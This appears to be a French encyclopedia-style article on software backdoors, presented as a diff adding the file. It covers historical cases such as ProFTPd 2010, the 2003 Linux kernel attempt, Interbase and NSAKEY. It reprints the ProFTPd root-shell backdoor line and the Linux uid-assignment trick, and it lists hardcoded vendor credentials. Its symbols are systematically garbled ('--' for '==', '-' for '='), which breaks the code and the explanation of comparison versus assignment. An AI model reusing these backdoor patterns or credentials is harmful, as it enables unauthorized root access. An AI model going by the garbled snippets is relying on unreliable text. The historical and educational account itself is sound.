@@ -1,0 +1,68 @@
+Dans un logiciel, une porte dérobée (de l'anglais backdoor, littéralement porte de derrière) est une fonctionnalité inconnue de l'utilisateur légitime, qui donne un accès secret au logiciel.
+L'introduction d'une porte dérobée dans un logiciel à l'insu de son utilisateur transforme le logiciel en cheval de Troie.
+
+Technique
+Une porte dérobée peut être introduite soit par le développeur du logiciel, soit par un tiers. La personne connaissant la porte dérobée peut l'utiliser pour surveiller les activités du logiciel, voire en prendre le contrôle (par contournement de l'authentification). Enfin, selon l'étendue des droits que le système d'exploitation donne au logiciel contenant la porte dérobée, le contrôle peut s'étendre à l'ensemble des opérations de l'ordinateur.
+La généralisation de la mise en réseau des ordinateurs rend les portes dérobées nettement plus utiles que du temps où un accès physique à l'ordinateur était la règle.
+Parmi les motivations amenant les développeurs de logiciel à créer des portes dérobées, il y a : l'intérêt pratique d'un accès facile et toujours ouvert au logiciel pour pouvoir mener efficacement les actions de maintenance ;; la possibilité de désactiver subrepticement le logiciel en cas de désaccord avec son client (non-paiement de licence).
+Parmi les motivations amenant les pirates informatiques à installer une porte dérobée : la possibilité de surveiller ce que fait l'utilisateur légitime et de copier ou détruire des données ayant une valeur (mots de passe, clé privée pour déchiffrer des messages privés, coordonnées bancaires, secrets commerciaux) ;; la possibilité de prendre le contrôle d'un ordinateur et de pouvoir l'utiliser pour mener des actions malfaisantes (envoi de pourriels notamment pour l'hameçonnage, de virus informatiques, déni de service) ;; le contrôle d'un vaste réseau d'ordinateurs (voir botnet), qui peut être utilisé pour du chantage au déni de service distribué (DDoS), ou revendu à des criminels.
+Pour installer des portes dérobées en masse, les pirates utilisent des vers. Ceux-ci se répandent automatiquement et installent un serveur informatique sur chaque ordinateur infecté. Ensuite le pirate peut se connecter à travers Internet au serveur.
+Une porte dérobée peut aussi être insérée par voie d'Easter egg, de compilateur (voir la section plus bas Le cas du compilateur C Unix: Trusting Trust), ou peut prendre la forme d'un programme, comme Back Orifice.
+
+Le cas du compilateur C Unix : Trusting Trust
+En 1984, l'informaticien américain Kenneth Thompson décrit, dans son article Reflections on Trusting Trust, comment il aurait été possible d'insérer une porte dérobée dans tous les programmes en C compilés sur Unix. De plus, vu que les versions mises à jour de ce compilateur, qui n'est rien d'autre qu'un autre programme compilé, sont compilées à partir du compilateur C préexistant, l'algorithme d'insertion de la porte dérobée se serait fait transmettre d'une mise à jour à une autre. Donc, si ce compilateur à porte dérobée avait été "lâché dans la nature" (en anglais : released in the wild) à l'origine, alors n'importe quel compilateur de C insérerait possiblement des portes dérobées de nos jours.
+Il est à noter que la porte dérobée présente dans tous les programmes C compilés n'apparaîtrait jamais dans le code source en C.
+L'appellation trust (pour confiance) vient du fait que le compilateur C d'origine est considéré par son utilisateur final comme une boîte noire digne de confiance.
+Pour un programmeur qui ne comprend pas le fonctionnement d'un tel compilateur, mais lui fait confiance, il serait difficile de penser qu'un programme, qu'il a lui-même écrit puis compilé, contient une porte dérobée.
+
+Affaires notables
+
+F5 Big-IP et Enterprise Manager (2012)
+Le 16 février 2012, une clef secrète permettant de s'authentifier en tant que root (Administrateur) sur la majorité des appareils vendus par F5 a été révélée. La faille a été corrigée par le vendeur le 06 juin 2012. Cette clef étant présente sur tous les appareils vulnérables, le bug a obtenu un Pwnie Award (en) durant la conférence BlackHat USA 2012.
+
+HP StorageWorks P2000 G3 (2010)
+Le 13 décembre 2010, un compte caché a été trouvé dans le système de stockage HP StorageWorks P2000 G3 : le nom d'utilisateur "admin" et le mot de passe "!admin" permet de s'identifier avec le maximum de privilèges. Il n'est pas possible de supprimer ce compte, par contre il est possible d'en changer le mot passe en passant par la ligne de commande (commande "set password admin password...").
+
+ProFTPd (2010)
+Le 28 novembre 2010, le tarball de la dernière version (1.3.3c) du serveur FTP ProFTPd a été remplacé par une version contenant une porte dérobée sur le serveur FTP officiel du projet. La porte dérobée ajoute une commande "HELP ACIDBITCHEZ" qui ouvre un shell en tant que l'utilisateur root. Le tarball a été propagé sur l'ensemble des miroirs officiels. La compromission a été découverte le 1er décembre 2010, et corrigée le 2 décembre. La porte dérobée a notamment ajouté la ligne suivante au fichier src-help.c :
+if (strcmp(target, "ACIDBITCHEZ") -- 0) (setuid(0); setgid(0); system("-bin-sh;-sbin-sh");)
+L'attaquant s'est introduit sur le serveur FTP en utilisant une faille du module SQL de PostgreSQL qui permet d'exécuter du code à distance. Cette faille a été publiée le 17 novembre 2010 dans le numéro 67 du magazine Phrack. La faille est corrigée par la version 1.3.3d de ProFTPd.
+
+Cisco Unified Videoconferencing (2010)
+Trois comptes ont été découverts dans un système de visioconférence Cisco, Cisco Unified Videoconferencing (UVC), modèles System 5110 et 5115, utilisant le système d'exploitation Linux. C'est Florent Daigniere qui a découvert ces comptes durant un audit et il les a diffusés sur la liste de diffusion Full Disclosure le 17 novembre 2010. Cisco a publié un bulletin de sécurité le même jour. Il s'agit des comptes "root", "cs" et "develop" qui ne peuvent ni être modifiés, ni être supprimés. Ils permettent un accès distant par les protocoles FTP et SSH. D'autres failles ont été découvertes durant cet audit.
+
+Noyau Linux (2003)
+Le 4 novembre 2003, une porte dérobée a été introduite dans le noyau Linux directement sur le serveur CVS par un attaquant se faisant passer pour David S. Miller (développeur noyau). Elle a été détectée dès le lendemain. Le serveur CVS était un miroir du dépôt officiel utilisant BitKeeper. La porte dérobée a été greffée très synthétiquement, elle consiste en deux lignes de langage C, ajoutées à la fonction sys-wait4 du fichier "kernel-exit.c" :
++ if ((options -- (--WCLONE--WALL)) (current-uid - 0))
+ + retval - -EINVAL;
+La condition (current-uid - 0) est censée être lue par un lecteur particulièrement naïf comme une comparaison "si le numéro d'utilisateur du processus est 0 (root)" mais signifie en réalité en langage C l'affectation "le numéro d'utilisateur du processus devient 0 (root)". Le résultat est que si cette fonction sys-wait4 truquée était appelée avec les paramètres --WCLONE--WALL, le processus prenait l'identité de root, le niveau d'utilisateur disposant des droits d'accès maximaux.
+Cette modification visait à profiter de la confusion entre divers langages de programmation, où le symbole de la comparaison de deux valeurs est le signe - (Pascal, Ada, ML...) et d'autres où c'est la double égalité -- qui joue ce rôle (C, C++, Java...), le signe - signifiant alors une affectation d'une valeur à une variable. Cette modification avait peu de chance de passer inaperçue, car ce type d'erreur est peu compatible avec le niveau en informatique de programmeurs travaillant sur le noyau Linux. Le langage C étant le langage de programmation le plus utilisé sur les systèmes de la famille Unix, très peu d'utilisateurs non débutants se seraient laissé prendre.
+De plus, le processus de développement collectif d'un logiciel (notamment celui d'un logiciel libre) impose que chaque modification soit validée ; elle doit pour cela avoir une justification légitime. Ainsi, toute modification, aussi minime soit-elle, apparaît dans les diff et soulève de légitimes interrogations si elle n'a pas une justification claire.
+
+Microsoft Windows NT4 et -NSAKEY (1999)
+-NSAKEY est le nom d'une variable découverte en août 1999 dans le système d'exploitation Windows NT 4 (SP5) de Microsoft. Cette version fut diffusée sans que les informations destinées au débugage soient enlevées. La variable découverte par Andrew D. Fernandes de Cryptonym Corporation contenait une clé publique de 1024 bits. La nouvelle provoqua un tollé général et l'apparition de diverses rumeurs concernant une éventuelle conspiration gouvernementale. Si la NSA avait effectivement été en possession de la clé secrète correspondant à la clé présente dans Windows NT, il lui aurait été possible de chiffrer des données provenant des utilisateurs et, avec la complicité de Microsoft, de récupérer ces informations.
+
+Interbase (1994-2001)
+Une porte dérobée a été découverte dans le système de gestion de base de données Interbase le 10 janvier 2001, lors de l'ouverture du code source par son éditeur, Borland. Il suffisait d'entrer le nom d'utilisateur "politically" et le mot de passe "correct" (politically correct, littéralement "politiquement correct" en français) pour se connecter en administrateur. Cette porte dérobée a été introduite entre 1992 et 1994. Ce compte ne pouvant pas être modifié ou supprimé, il fallait par conséquent installer une nouvelle version d'Interbase ne contenant pas ce compte caché.
+
+BIOS
+Des BIOS de certains fabricants (dont les deux principaux, AMI et AWARD) ont un mot de passe caché permettant d'accéder au BIOS même s'il est protégé par un mot de passe choisi par l'utilisateur. Le mot de passe caché dépend du modèle de BIOS.
+
+Failles de sécurité introduites involontairement
+Dans les affaires suivantes, une modification d'un logiciel a introduit une faille de sécurité, sans que l'auteur de la modification ne l'ait fait volontairement. L'auteur n'avait pas les compétences pour évaluer que sa modification puisse introduire une faille de sécurité, ou plus simplement il n'a pas pensé à l'impact qu'elle pouvait avoir sur la sécurité du produit.
+
+OpenSSL packagé par Debian (2006-2008)
+Le 17 septembre 2006, une faille de sécurité a été introduite involontairement dans la version Debian de la bibliothèque OpenSSL. C'est le mainteneur du paquet OpenSSL, Kurt Roeckx, qui a introduit le 2 mai 2006 une faille de sécurité dans OpenSSL en voulant corriger un avertissement de l'outil Valgrind, qui était en fait un faux-positif. Le fait que la modification ait introduit une faille de sécurité est involontaire : Kurt Roeckx a contacté les développeurs d'OpenSSL pour demander conseil, mais il a posté sur la mauvaise liste (openssl-users au lieu d'openssl-dev) et une confusion s'en est suivi. La première version vulnérable, 0.9.8c-1, a été téléchargée dans la distribution instable le 17 septembre 2006. La faille a été trouvée en mai 2008 et corrigée le 13 mai 2008.
+La modification d'OpenSSL a réduit l'entropie du générateur de nombres aléatoires à seulement environ 15 bits : seul l'identifiant de processus (PID) était utilisé. Un identifiant peut avoir une valeur entre 1 et PID-MAX (32768), ce qui ne donne que 32 767 graines possibles. Au niveau des clés de chiffrement, il en existe trois fois plus, 98 301, car la génération des clés dépend de l'architecture, et dans ce cas 3 architectures différentes entrent en jeu (little-endian 32 bits, little-endian 64 bits et big-endian 32 bits).
+
+Installeur Ubuntu (2005-2006)
+L'installeur du système d'exploitation Ubuntu, dans sa version 5.10 (Breezy Badger, sortie le 13 octobre 2005) uniquement, écrivait le mot de passe de l'utilisateur root dans plusieurs fichiers de log lisible par n'importe quel utilisateur. Le bug a été trouvé par Karl ie le 12 mars 2006, puis corrigé le même jour. Ce bug permet à un utilisateur local d'élever ses privilèges. Il est plus probable que ça soit un oubli des programmeurs de l'installeur, qu'une faille de sécurité introduite volontairement.
+
+Dans la culture populaire
+Le scénario du film américain WarGames repose sur une porte dérobée. Le concepteur d'un système informatique militaire y insère une porte dérobée sous la forme d'un mot de passe non documenté qui y donne accès. Ce mot de passe donne aussi accès à des fonctionnalités non-documentées du programme, qui donne au système de contrôle d'armement l'apparence d'un jeu vidéo de simulation de guerre.
+Dans le film Tron : L'Héritage Sam Flynn s'introduit dans la grille à l'aide d'un identifiant en porte dérobée.
+Dans la série Person of Interest, une porte dérobée implantée dans un système de surveillance de masse appartenant au gouvernement appelé la Machine permet à deux hommes de l'utiliser secrètement.
+
+Voir aussi
+
+Articles connexes: Rootkit; NSA, Bullrun; Jonathan Pollard; Backdoor Shell; (en) logiciel PROMIS Prosecutor's Management Information System; (de) logiciel PROMIS Prosecutor's Management Information System; (en) Société Inslaw Institute for Law and Social Research.
